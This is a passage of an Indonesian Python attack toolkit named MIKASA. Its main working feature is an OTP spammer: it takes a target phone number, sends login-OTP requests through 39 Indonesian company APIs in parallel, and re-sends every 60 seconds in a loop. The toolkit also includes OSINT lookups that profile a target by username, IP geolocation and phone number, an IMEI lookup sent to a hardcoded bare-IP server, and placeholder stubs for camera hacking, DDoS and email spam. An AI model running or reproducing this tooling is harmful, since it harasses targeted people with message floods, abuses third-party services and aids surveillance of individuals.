            'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJXZWIgQnJvd3NlciIsImRlc2NyaXB0aW9uIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0Ny4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidGltZXpvbmUiOiJBc2lhL0pha2FydGEifQ==',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Connection': 'keep-alive'
        }

        payload = {
            'phone': nomor_format,
            'tnc_accept': True,
            'device': 'Blink',
            'platform': 'web',
            'host': 'https://partner.dokterin.co.id'
        }

        resp = requests.post(
            'https://api.dokterin.id/user/v1/users/login',
            json=payload,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def mulai_spam(nomor):
     global cooldown_otp, stop_cooldown
    
     apis = {
        "1": spam_otp_adiraku,
        "2": spam_otp_tokopedia,
        "3": spam_otp_singa,
        "4": spam_otp_pinhome,
        "5": spam_otp_duniagames,
        "6": spam_otp_acc,
        "7": spam_otp_absenku,
        "8": spam_otp_saturdays,
        "9": spam_otp_maulagi,
        "10": spam_otp_bliblitiket,
        "11": spam_otp_matahari,
        "12": spam_otp_rumah123,
        "13": spam_otp_halodoc,
        "14": spam_otp_misteraladin,
        "15": spam_otp_paper,
        "16": spam_otp_planetban,
        "17": spam_otp_bunda,
        "18": spam_otp_bonusbelanja,
        "19": spam_otp_hijup,
        "20": spam_otp_alodokter,
        "21": spam_otp_ohsome,
        "22": spam_otp_optikmelawai,
        "23": spam_otp_hollandbakery,
        "24": spam_otp_hashmicro,
        "25": spam_otp_tuneup,
        "26": spam_otp_ultramilk,
        "27": spam_otp_kaniva,
        "28": spam_otp_jembatani,
        "29": spam_otp_rcx,
        "30": spam_otp_sahabatteknisi,
        "31": spam_otp_liva,
        "32": spam_otp_daihatsu,
        "33": spam_otp_kreditpintar,
        "34": spam_otp_internetrakyat,
        "35": spam_otp_pinjamduit,
        "36": spam_otp_isellershop,
        "37": spam_otp_greensm,
        "38": spam_otp_tiptip,
        "39": spam_otp_dokterin
    }
     hasil = {}
     with ThreadPoolExecutor(max_workers=len(apis)) as executor:
        futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
        for future in as_completed(futures):
            nama = futures[future]
            try:
                hasil[nama] = future.result()
            except:
                hasil[nama] = False
    
     berhasil = sum(1 for v in hasil.values() if v)
     gagal = len(hasil) - berhasil
    
     print(f"{G}─────────────────────────────────────────────────────────────{N}")
     print(f"{G}  HASIL PENGIRIMAN OTP{N}")
     print(f"{G}─────────────────────────────────────────────────────────────{N}")
     print(f"  {W}Total {G}Berhasil {W}: {G}{berhasil}{N}")
     print(f"  {W}Total {R}Gagal   {W}: {R}{gagal}{N}")
     print(f"{G}─────────────────────────────────────────────────────────────{N}")
    
    # Set cooldown 60 detik
     with cooldown_lock:
        cooldown_otp = time.time() + 60
    
     print(f"""{Y} 
█▀ █▀█ █░ █▀▄ █▀█ █░█░█ █▄░█
█▄ █▄█ █▄ █▄▀ █▄█ ▀▄▀▄▀ █░▀█ {N}""")
     print(f"{Y}[!] Cooldown 60 detik. Kirim otomatis ulang setelah selesai.{N}")
     print(f"{Y}[!] Tekan ENTER untuk kembali ke MIKASA (keluar dari spam){N}")
     print()
    
    # Timer cooldown dengan deteksi ENTE
     stop_cooldown = False
     import sys, select
    
     for i in range(60, 0, -1):
        if stop_cooldown:
            break
        if select.select([sys.stdin], [], [], 0)[0]:
            cmd = sys.stdin.readline().strip()
            if cmd == "":
                stop_cooldown = True
                break
        
        print(f"{Y}[⏳] Sisa {i} detik... (Tekan ENTER untuk kembali){N}", end="\r")
        time.sleep(1)
    
     print("\n" + " " * 70 + "\r", end="")
    
     if stop_cooldown:
        print(f"{Y}[!] Kembali ke MIKASA...{N}")
        time.sleep(1)
        return  # BALIK KE MENU
    
    # Kalo ga ditekan ENTER, spam ulang
     print(f"{G}[✓] Cooldown selesai! Mengirim ulang OTP...{N}\n")
     time.sleep(1)
     mulai_spam(nomor)

def tool_otp_spam():
    global cooldown_otp, stop_cooldown
    os.system('clear')
    
   
    with cooldown_lock:
        sisa = cooldown_otp - time.time()
        if sisa > 0:
            print(f"{R}─────────────────────────────────────────────────────────────{N}")
            print(f"""
{R}╔═╗╔═╦══╦╗╔═╦═══╦═══╦═══╗
{R}║║╚╝║╠╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║
{R}║╔╗╔╗║║║║╚╝╝║║─║║╚══╣║─║║
{R}║║║║║║║║║╔╗║║╚═╝╠══╗║╚═╝║
{R}║║║║║╠╣╠╣║║╚╣╔═╗║╚═╝║╔═╗║
{R}╚╝╚╝╚╩══╩╝╚═╩╝─╚╩═══╩╝─╚╝ {N}""")
            print(f"{R}  Tunggu {Y}{int(sisa)} detik{R} sebelum spam lagi{N}")
            print(f"{R}─────────────────────────────────────────────────────────────{N}")
            print()
            
            stop_cooldown = False
            import sys, select
            
            for i in range(int(sisa), 0, -1):
                if stop_cooldown:
                    break
                if select.select([sys.stdin], [], [], 0)[0]:
                    cmd = sys.stdin.readline().strip()
                    if cmd == "":
                        stop_cooldown = True
                        break
                print(f"{Y}[⏳] Sisa {i} detik...{N}", end="\r")
                time.sleep(1)
            
            print("\n" + " " * 50 + "\r", end="")
            
            if stop_cooldown:
                print(f"{Y}[!] Kembali ke MIKASA...{N}")
                time.sleep(1)
                return
            
            print(f"{G}[✓] Cooldown selesai!{N}")
            time.sleep(1)
            # LANJUT KE BAWAH
    
    print(f"""
{R}─────────────────────────────────────────────────────────────{N}
{R}  {W}                                     {R}│{N}  {R}  -••••{N}
{R}  {W}█▀ █▀█ ▄▀█ █▀▄▀█                     {R}│{N}  {R} -••••••{N}
{R}  {W}▄█ █▀▀ █▀█ █░▀░█                     {R}│{N}  {R}-••  ••••{N}
{R}  {W}█▀█ ▀█▀ █▀█                          {R}│{N}  {R}-••    ••••{N}
{R}  {W}█▄█ ░█░ █▀▀                          {R}│{N}  {R}-••••  ••••••{N}
{R}  {W}                                     {R}│{N}  {R} -••••••••••{N}
{R}  {W}AUTHOR = Rullzz06{N}                    {R}│{N}  {R}   -••••••{N}
{R}─────────────────────────────────────────────────────────────{N}  
{R}  {Y}📌 Contoh Format nomor:{N}
{R}    {W}08xxxxxxxxxx{N}
{R}    {W}628xxxxxxxxxx{N}
{R}    {W}+628xxxxxxxxxx{N}
{R}─────────────────────────────────────────────────────────────{N}
{R}  {Y}💡 Masukkan nomor target, atau {R}ENTER {Y}untuk kembali{N}
{R}─────────────────────────────────────────────────────────────{N}
 """)
    
    nomor = input(f"{R}┌──({P}MIKASA{R})-[{C}OTP{R}]\n└─{R}${N} ").strip()
    
    if not nomor:
        print(f"{Y}[!] Kembali ke MIKASA...{N}")
        time.sleep(1)
        return
    
    # Format nomor
    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+"):
        nomor = nomor[1:]
    elif not nomor.startswith("62"):
        nomor = "62" + nomor
    
    print(f"\n{G}[+] Target: +{nomor}{N}")
    print(f"{Y}[+] Mengirim OTP...{N}")
    mulai_spam(nomor)
    time.sleep(10)
    
def tool_Hack_camera():
    os.system('clear')
    print(f"{Y}[!] HACK CAMERA - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_osint():
    os.system('clear')
    
    # Warna lokal OSINT (hijau, putih, ungu)
    GREEN = '\033[92m'
    WHITE = '\033[1;37m'
    PURPLE = '\033[38;5;129m'
    RED = '\033[1;31m'
    YELLOW = '\033[1;33m'
    RESET = '\033[0m'
    
    def clear_screen():
        os.system('clear')
    
    def header_osint():
        clear_screen()
        print(f"{GREEN}")
        print(" ██████╗ ███████╗██╗███╗   ██╗████████╗")
        print(" ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝")
        print(" ██║   ██║███████╗██║██╔██╗ ██║   ██║   ")
        print(" ██║   ██║╚════██║██║██║╚██╗██║   ██║   ")
        print(" ╚██████╔╝███████║██║██║ ╚████║   ██║   ")
        print("  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   ")
        print(f"{RESET}")
        print(f"{WHITE}  —————————————————————————————————")
        print(f"  {WHITE}Author : {GREEN}Rulzz06")
        print(f"  {WHITE}Tools  : {GREEN}OSINT PRO")
        print(f"  {WHITE}—— ketik {GREEN}exit {WHITE}untuk kembali ke MIKASA ——")
        print(f"{WHITE}  —————————————————————————————————{RESET}")
    
    def separator_osint():
        print(f"{GREEN}—————————————————————————————————————————————————{RESET}")
    
    def cek_myip_osint():
        try:
            resp = requests.get("https://api.ipify.org?format=json", timeout=5)
            data = resp.json()
            print(f"\n{WHITE}[{GREEN}+{WHITE}] My IP Address: {GREEN}{data.get('ip', '-')}{RESET}")
            separator_osint()
        except Exception as e:
            print(f"\n{WHITE}[{RED}!{WHITE}] Error: {RED}{e}{RESET}")
    
    def cek_usn_osint():
        print(f"\n{WHITE}⟬{GREEN}𝗠𝗮𝘀𝘂𝗸𝗸𝗮𝗻 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗧𝗮𝗿𝗴𝗲𝘁{WHITE} ⟭{PURPLE}➤➤{RESET} ", end="")
        username = input().strip()
        
        if username.lower() == 'exit':
            return 'exit'
        
        if not username:
            print(f"\n{WHITE}[{RED}!{WHITE}] Username tidak boleh kosong!{RESET}")
            return
        
        situs = {
            "GitHub"       : f"https://github.com/{username}",
            "GitLab"       : f"https://gitlab.com/{username}",
            "Twitter/X"    : f"https://twitter.com/{username}",
            "Instagram"    : f"https://instagram.com/{username}",
            "TikTok"       : f"https://tiktok.com/@{username}",
            "Facebook"     : f"https://facebook.com/{username}",
            "Reddit"       : f"https://reddit.com/user/{username}",
            "Pinterest"    : f"https://pinterest.com/{username}",
            "Tumblr"       : f"https://tumblr.com/{username}",
            "Twitch"       : f"https://twitch.tv/{username}",
            "YouTube"      : f"https://youtube.com/@{username}",
            "LinkedIn"     : f"https://linkedin.com/in/{username}",
            "Telegram"     : f"https://t.me/{username}",
            "Steam"        : f"https://steamcommunity.com/id/{username}",
            "Keybase"      : f"https://keybase.io/{username}",
            "Pastebin"     : f"https://pastebin.com/u/{username}",
            "Replit"       : f"https://replit.com/@{username}",
            "HackerNews"   : f"https://news.ycombinator.com/user?id={username}",
            "ProductHunt"  : f"https://producthunt.com/@{username}",
            "Gravatar"     : f"https://gravatar.com/{username}",
            "Spotify"      : f"https://open.spotify.com/user/{username}",
            "Vimeo"        : f"https://vimeo.com/{username}",
            "Dribbble"     : f"https://dribbble.com/{username}",
            "Behance"      : f"https://behance.net/{username}",
            "Medium"       : f"https://medium.com/@{username}",
            "DeviantArt"   : f"https://deviantart.com/{username}",
            "VK"           : f"https://vk.com/{username}",
            "Snapchat"     : f"https://snapchat.com/add/{username}",
        }
        
        print(f"\n{WHITE}[*] Scanning username: {GREEN}{username}{RESET}")
        print(f"{WHITE}[*] Total platforms: {GREEN}{len(situs)}{RESET}")
        separator_osint()
        
        ditemukan = 0
        tidak = 0
        
        for nama, url in situs.items():
            try:
                resp = requests.get(url, timeout=5, allow_redirects=True)
                if resp.status_code == 200:
                    print(f"{WHITE}[{GREEN}+{WHITE}] {nama:<15} : {GREEN}FOUND{RESET} → {url}")
                    ditemukan += 1
                else:
                    print(f"{WHITE}[{RED}-{WHITE}] {nama:<15} : {RED}NOT FOUND{RESET}")
                    tidak += 1
            except Exception:
                print(f"{WHITE}[{YELLOW}!{WHITE}] {nama:<15} : {YELLOW}TIMEOUT/ERROR{RESET}")
                tidak += 1
            time.sleep(0.1)
        
        separator_osint()
        print(f"{WHITE}[+] Found     : {GREEN}{ditemukan}{RESET}")
        print(f"{WHITE}[+] Not Found : {RED}{tidak}{RESET}")
        print(f"{WHITE}[+] Total     : {GREEN}{len(situs)}{RESET}")
        separator_osint()
        
        print(f"\n{WHITE}[{GREEN}+{WHITE}] Scan selesai! {GREEN}Tekan Enter untuk lanjut{RESET}")
        input()
    
    def cek_ip_osint():
        print(f"\n{WHITE}⟬{GREEN}𝗠𝗮𝘀𝘂𝗸𝗸𝗮𝗻 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀{WHITE} ⟭{PURPLE}➤➤{RESET} ", end="")
        ip = input().strip()
        
        if ip.lower() == 'exit':
            return 'exit'
        
        if not ip:
            print(f"\n{WHITE}[{RED}!{WHITE}] IP tidak boleh kosong!{RESET}")
            return
        
        try:
            fields = "status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
            resp = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
            data = resp.json()
            
            if data.get("status") == "fail":
                print(f"\n{WHITE}[{RED}!{WHITE}] {RED}{data.get('message', 'IP tidak valid')}{RESET}")
                return
            
            print(f"\n{WHITE}[*] IP Information for: {GREEN}{ip}{RESET}")
            separator_osint()
            print(f"{WHITE}  IP         : {GREEN}{data.get('query', '-')}")
            print(f"{WHITE}  Reverse DNS: {GREEN}{data.get('reverse', '-')}")
            print(f"{WHITE}  ASN        : {GREEN}{data.get('as', '-')}")
            print(f"{WHITE}  ASN Name   : {GREEN}{data.get('asname', '-')}")
            print(f"{WHITE}  ISP        : {GREEN}{data.get('isp', '-')}")
            print(f"{WHITE}  ORG        : {GREEN}{data.get('org', '-')}")
            print(f"{WHITE}  Continent  : {GREEN}{data.get('continent', '-')} ({data.get('continentCode', '-')})")
            print(f"{WHITE}  Country    : {GREEN}{data.get('country', '-')} ({data.get('countryCode', '-')})")
            print(f"{WHITE}  Region     : {GREEN}{data.get('regionName', '-')} ({data.get('region', '-')})")
            print(f"{WHITE}  City       : {GREEN}{data.get('city', '-')}")
            print(f"{WHITE}  District   : {GREEN}{data.get('district', '-') or '-'}")
            print(f"{WHITE}  ZIP        : {GREEN}{data.get('zip', '-')}")
            print(f"{WHITE}  Latitude   : {GREEN}{data.get('lat', '-')}")
            print(f"{WHITE}  Longitude  : {GREEN}{data.get('lon', '-')}")
            print(f"{WHITE}  Timezone   : {GREEN}{data.get('timezone', '-')}")
            print(f"{WHITE}  UTC Offset : {GREEN}{data.get('offset', '-')}")
            print(f"{WHITE}  Currency   : {GREEN}{data.get('currency', '-')}")
            print(f"{WHITE}  Proxy/VPN  : {GREEN}{'Yes' if data.get('proxy') else 'No'}")
            print(f"{WHITE}  Mobile     : {GREEN}{'Yes' if data.get('mobile') else 'No'}")
            print(f"{WHITE}  Hosting    : {GREEN}{'Yes' if data.get('hosting') else 'No'}{RESET}")
            separator_osint()
            print(f"\n{WHITE}[{GREEN}+{WHITE}] Selesai! {GREEN}Tekan Enter untuk lanjut{RESET}")
            input()
        except Exception as e:
            print(f"\n{WHITE}[{RED}!{WHITE}] Error: {RED}{e}{RESET}")
    
    def cek_tlp_osint():
        print(f"\n{WHITE}⟬{GREEN}𝗠𝗮𝘀𝘂𝗸𝗸𝗮𝗻 𝗡𝗼𝗺𝗼𝗿 𝗧𝗲𝗹𝗲𝗽𝗼𝗻 𝗜𝗻𝘁𝗲𝗿𝗻𝗮𝘀𝗶𝗼𝗻𝗮𝗹{WHITE} ⟭{PURPLE}➤➤{RESET} ", end="")
        nomor = input().strip()
        
        if nomor.lower() == 'exit':
            return 'exit'
        
        if not nomor:
            print(f"\n{WHITE}[{RED}!{WHITE}] Nomor tidak boleh kosong!{RESET}")
            return
        
        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone
            
            parsed = phonenumbers.parse(nomor)
            valid = phonenumbers.is_valid_number(parsed)
            wilayah = geocoder.description_for_number(parsed, "id")
            operator = carrier.name_for_number(parsed, "id")
            zona = timezone.time_zones_for_number(parsed)
            intl = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            lokal = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
            
            print(f"\n{WHITE}[*] Phone Information{RESET}")
            separator_osint()
            print(f"{WHITE}  Number      : {GREEN}{intl}")
            print(f"{WHITE}  Local       : {GREEN}{lokal}")
            print(f"{WHITE}  Status      : {GREEN}{'VALID' if valid else 'INVALID'}")
            print(f"{WHITE}  Region      : {GREEN}{wilayah if wilayah else 'Tidak Diketahui'}")
            print(f"{WHITE}  Operator    : {GREEN}{operator if operator else 'Tidak Diketahui'}")
            print(f"{WHITE}  Timezone    : {GREEN}{', '.join(zona) if zona else 'Tidak Diketahui'}{RESET}")
            separator_osint()
            print(f"\n{WHITE}[{GREEN}+{WHITE}] Selesai! {GREEN}Tekan Enter untuk lanjut{RESET}")
            input()
        except Exception as e:
            print(f"\n{WHITE}[{RED}!{WHITE}] Error: {RED}{e}{RESET}")
    
    def channel_wa_osint():
        print(f"\n{WHITE}[*] Opening WhatsApp Channel...{RESET}")
        try:
            os.system("xdg-open 'https://whatsapp.com/channel/0029VbDCEA3AO7RNkGKmwN2t'")
        except:
            print(f"{WHITE}[{RED}!{WHITE}] Gagal membuka browser. Buka manual: {GREEN}https://whatsapp.com/channel/0029VbDCEA3AO7RNkGKmwN2t{RESET}")
        print(f"\n{WHITE}[{GREEN}+{WHITE}] Selesai! {GREEN}Tekan Enter untuk lanjut{RESET}")
        input()
    
    # ===== MENU UTAMA OSINT =====
    while True:
        header_osint()
        print(f"\n  {WHITE}[{GREEN}1{WHITE}] Check Username")
        print(f"  {WHITE}[{GREEN}2{WHITE}] Check IP Address")
        print(f"  {WHITE}[{GREEN}3{WHITE}] Check Phone Number")
        print(f"  {WHITE}[{GREEN}4{WHITE}] Check My IP")
        print(f"  {WHITE}[{GREEN}5{WHITE}] WhatsApp Channel")
        print(f"  {WHITE}[{GREEN}0{WHITE}] Back to MIKASA")
        separator_osint()
        
        print(f"\n{WHITE}⟬{GREEN}𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂 𝗢𝗦𝗜𝗡𝗧{WHITE} ⟭{PURPLE}➤➤{RESET} ", end="")
        pilihan = input().strip()
        
        if pilihan == '0':
            print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
            time.sleep(1)
            break
        
        elif pilihan == '1':
            result = cek_usn_osint()
            if result == 'exit':
                print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
                time.sleep(1)
                break
        
        elif pilihan == '2':
            result = cek_ip_osint()
            if result == 'exit':
                print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
                time.sleep(1)
                break
        
        elif pilihan == '3':
            result = cek_tlp_osint()
            if result == 'exit':
                print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
                time.sleep(1)
                break
        
        elif pilihan == '4':
            cek_myip_osint()
            print(f"\n{WHITE}[{GREEN}+{WHITE}] Tekan Enter untuk lanjut{RESET}")
            input()
        
        elif pilihan == '5':
            channel_wa_osint()
        
        else:
            print(f"\n{WHITE}[{RED}!{WHITE}] Pilihan tidak valid!{RESET}")
            time.sleep(1)

def tool_email_spam():
    os.system('clear')
    print(f"{Y}[!] Email Spammer - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_decoder():
    os.system('clear')
    print(f"{Y}[!] DDOS - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_encryptor():
    os.system('clear')
    print(f"{Y}[!] File Encryptor - Dalam pengembangan{N}")
    input("Tekan ENTER...")
 
def tool_imei_checker():
    API_IMEI_URL = "http://46.247.108.15:3011/cekimei"
    HASIL_FOLDER = "hasil_cek"

    if not os.path.exists(HASIL_FOLDER):
        os.makedirs(HASIL_FOLDER)

    H = '\033[92m'        # Hijau
    K = '\033[1;33m'      # Kuning
    P = '\033[1;37m'      # Putih
    RESET = '\033[0m'

    def format_imei_result(data, imei):
        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        
        if isinstance(data, dict):
            merk = data.get("merk", "Tidak diketahui")
            tipe = data.get("tipe", "Tidak diketahui")
            status = data.get("status", "Tidak diketahui")
            imei_status = data.get("imei_status", "Tidak diketahui")
            network = data.get("network", "Tidak diketahui")
            region = data.get("region", "Tidak diketahui")
            country = data.get("country", "Tidak diketahui")
            city = data.get("city", "Tidak diketahui")
            isp = data.get("isp", "Tidak diketahui")
            ip = data.get("ip", "Tidak diketahui")
            device_model = data.get("device_model", "Tidak diketahui")
            device_brand = data.get("device_brand", "Tidak diketahui")
            device_year = data.get("device_year", "Tidak diketahui")
            device_ram = data.get("device_ram", "Tidak diketahui")
            device_storage = data.get("device_storage", "Tidak diketahui")
            device_camera = data.get("device_camera", "Tidak diketahui")
            device_battery = data.get("device_battery", "Tidak diketahui")
            device_os = data.get("device_os", "Tidak diketahui")
            device_cpu = data.get("device_cpu", "Tidak diketahui")
            device_gpu = data.get("device_gpu", "Tidak diketahui")
            device_screen = data.get("device_screen", "Tidak diketahui")
            device_price = data.get("device_price", "Tidak diketahui")
        else:
            merk = tipe = status = imei_status = network = region = country = city = isp = ip = "Tidak diketahui"
            device_model = device_brand = device_year = device_ram = device_storage = device_camera = device_battery = "Tidak diketahui"
            device_os = device_cpu = device_gpu = device_screen = device_price = "Tidak diketahui"
        
        if "valid" in str(status).lower() or "active" in str(status).lower():
            status_color = H
        elif "invalid" in str(status).lower() or "blocked" in str(status).lower():
            status_color = '\033[91m'
        else:
            status_color = K
        
        return f"""
{H}┌────────────────────────────────────────────────────────────┐
{H}│{P}                   📱 HASIL CEK IMEI 📱                 {H}│
{H}├────────────────────────────────────────────────────────────┤
{H}│{P}  ────────[ {H}INFORMASI DEVICE {P}]────────{H}           │
{H}│  {P}🆔 IMEI        : {K}{imei}{P}                          │
{H}│  {P}📱 Merk        : {K}{merk}{P}                          │
{H}│  {P}📱 Tipe        : {K}{tipe}{P}                          │
{H}│  {P}📊 Status      : {status_color}{status}{P}              │
{H}│  {P}📊 IMEI Status : {status_color}{imei_status}{P}         │
{H}│{P}  ────────[ {H}JARINGAN & LOKASI {P}]────────{H}        │
{H}│  {P}📡 Network     : {K}{network}{P}                       │
{H}│  {P}🌍 Region      : {K}{region}{P}                        │
{H}│  {P}🏳️ Country     : {K}{country}{P}                       │
{H}│  {P}🏙️ City        : {K}{city}{P}                          │
{H}│  {P}🔌 ISP         : {K}{isp}{P}                           │
{H}│  {P}🌐 IP Address  : {K}{ip}{P}                            │
{H}│{P}  ────────[ {H}SPESIFIKASI DEVICE {P}]────────{H}       │
{H}│  {P}📱 Model       : {K}{device_model}{P}                  │
{H}│  {P}🏷️ Brand       : {K}{device_brand}{P}                  │
{H}│  {P}📅 Tahun Rilis : {K}{device_year}{P}                   │
{H}│  {P}🧠 RAM         : {K}{device_ram}{P}                    │
{H}│  {P}💾 Storage     : {K}{device_storage}{P}                │
{H}│  {P}📸 Camera      : {K}{device_camera}{P}                 │
{H}│  {P}🔋 Battery     : {K}{device_battery}{P}                │
{H}│  {P}💻 OS          : {K}{device_os}{P}                     │
{H}│  {P}⚙️ CPU         : {K}{device_cpu}{P}                    │
{H}│  {P}🎮 GPU         : {K}{device_gpu}{P}                    │
{H}│  {P}📺 Screen      : {K}{device_screen}{P}                 │
{H}│  {P}💰 Price       : {K}{device_price}{P}                  │
{H}├────────────────────────────────────────────────────────────┤
{H}│  {P}🕐 Waktu Cek   : {K}{now}{P}                          │
{H}├────────────────────────────────────────────────────────────┤
{H}│{K}  💾 Tersimpan di: {P}{HASIL_FOLDER}/imei_{imei}_{now[:10]}.txt{H}│
{H}└────────────────────────────────────────────────────────────┘
"""

    def simpan_hasil_imei(jenis, input_data, response_data, success, formatted_result):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'{timestamp}_{jenis}'
        
        json_file = os.path.join(HASIL_FOLDER, f'{filename}.json')
        hasil = {
            'waktu_cek': datetime.now().isoformat(),
            'jenis_cek': jenis,
            'input': input_data,
            'success': success,
            'response': response_data
        }
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(hasil, f, indent=2, ensure_ascii=False)
        
        txt_file = os.path.join(HASIL_FOLDER, f'{filename}.txt')
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write(formatted_result)
        
        return json_file, txt_file

    def cek_imei(imei):
        try:
            headers = {'Content-Type': 'application/json'}
            payload = {'imei': imei}
            
            print(f"{K}┌────────────────────────────────────────────────────────────┐{RESET}")
            print(f"{K}│{P}  🔍 Sedang mengecek IMEI...                          {K}│{RESET}")
            print(f"{K}└────────────────────────────────────────────────────────────┘{RESET}")
            
            for i in range(3):
                sys.stdout.write(f"\r{K}  {'█' * (i+1)}{'░' * (2-i)}  {i+1}/3{RESET}")
                sys.stdout.flush()
                time.sleep(0.5)
            print()
            
            response = requests.post(API_IMEI_URL, json=payload, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            
            formatted = format_imei_result(data, imei)
            json_file, txt_file = simpan_hasil_imei('imei', imei, data, True, formatted)
            
            return {
                'success': True,
                'data': data,
                'formatted': formatted,
                'json_file': json_file,
                'txt_file': txt_file
            }
        except Exception as e:
            error_data = {'error': str(e)}
            formatted = f"""
{K}┌────────────────────────────────────────────────────────────┐
{K}│{P}                   ❌ ERROR CEK IMEI ❌                 {K}│
{K}├────────────────────────────────────────────────────────────┤
{K}│  {P}Error: {K}{str(e)}{P}                                    │
{K}└────────────────────────────────────────────────────────────┘
"""
            json_file, txt_file = simpan_hasil_imei('imei', imei, error_data, False, formatted)
            return {
                'success': False,
                'error': str(e),
                'formatted': formatted,
                'json_file': json_file,
                'txt_file': txt_file
            }

    def lihat_history_imei():
        os.system('clear')
        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
        print(f"{H}  {P}📜 HISTORY PENGECEKAN IMEI{RESET}")
        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
        
        if not os.path.exists(HASIL_FOLDER):
            print(f"{K}📂 Belum ada history.{RESET}")
            input(f"\n{K}Tekan Enter untuk kembali...{RESET}")
            return
        
        files = [f for f in os.listdir(HASIL_FOLDER) if f.endswith('.txt') and 'imei' in f]
        files = sorted(files, reverse=True)
        
        if not files:
            print(f"{K}📂 Belum ada history pengecekan IMEI.{RESET}")
            input(f"\n{K}Tekan Enter untuk kembali...{RESET}")
            return
        
        print(f"\n{P}No  | File{RESET}")
        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
        for i, file in enumerate(files[:20], 1):
            filepath = os.path.join(HASIL_FOLDER, file)
            waktu = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
            print(f"{P}{i:<3} | {file[:40]:<40} | {waktu}{RESET}")
        
        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
        print(f"{K}💡 Hasil tersimpan di folder {H}{HASIL_FOLDER}/{RESET}")
        input(f"\n{K}Tekan Enter untuk kembali...{RESET}")

    def banner_imei():
        os.system('clear')
        print(f"""
{H}    ██╗███╗   ███╗███████╗██
{H}    ██║████╗ ████║██╔════╝██
{H}    ██║██╔████╔██║█████╗  ██
{H}    ██║██║╚██╔╝██║██╔══╝  ██
{H}    ██║██║ ╚═╝ ██║███████╗██
{H}    ╚═╝╚═╝     ╚═╝╚══════╝
{H}┌────────────────────────────────────────────────────────────┐
{H}│{P}  🔍 Cek keaslian dan status IMEI device               {H}│
{H}│{K}  📋 Hasil otomatis tersimpan di folder {H}hasil_cek{K}       {H}│
{H}├────────────────────────────────────────────────────────────┤
{H}│                                                            │
{H}│  {P}[{K}1{P}] Cek IMEI                                      │
{H}│  {P}[{K}2{P}] Lihat History Pengecekan                        │
{H}│  {P}[{K}0{P}] Kembali ke MIKASA                             │
{H}│                                                            │
{H}└────────────────────────────────────────────────────────────┘{RESET}
""")

    while True:
        banner_imei()
        print(f"{P}⟬{K}𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂{P} ⟭{H}➤➤{RESET} ", end="")
        pilihan = input().strip()
        
        if pilihan == "0":
            print(f"\n{K}[!] Kembali ke MIKASA...{RESET}")
            time.sleep(1)
            break
        
        elif pilihan == "1":
            os.system('clear')
            print(f"""
{H}┌────────────────────────────────────────────────────────────┐
{H}│{P}                   🔍 CEK IMEI                          {H}│
{H}├────────────────────────────────────────────────────────────┤
{H}│{P}  ────────────────[ {H}I N F O {P} ]────────────────{H}  │
{H}│{P}  📱 Masukkan 15 digit IMEI device Target              {H}│
{H}│{P}  ⚠️  Limit: Harus {K}15 digit angka {P}tanpa spasi     {H}│
{H}│{P}  📌 Contoh: {K}123456789012345                        {H}│
{H}└────────────────────────────────────────────────────────────┘{RESET}
""")
            print(f"{P}⟬{K}𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗜𝗠𝗘𝗜{P} ⟭{H}➤➤{RESET} ", end="")
            imei = input().strip()
            
            if not imei:
                print(f"\n{K}[!] IMEI tidak boleh kosong!{RESET}")
                time.sleep(1)
                continue
            
            if len(imei) != 15:
                print(f"\n{K}[!] IMEI harus {H}15 digit{K}! (Anda memasukkan {H}{len(imei)}{K} digit){RESET}")
                time.sleep(2)
                continue
            
            if not imei.isdigit():
                print(f"\n{K}[!] IMEI harus berupa {H}angka{K}!{RESET}")
                time.sleep(2)
                continue
            
            result = cek_imei(imei)
            print(result['formatted'])
            if result['success']:
                print(f"\n{H}✅ Hasil tersimpan di: {K}{result['txt_file']}{RESET}")
            
            print(f"\n{K}[!] Tekan Enter untuk kembali...{RESET}")
            input()
        
        elif pilihan == "2":
            lihat_history_imei()
        
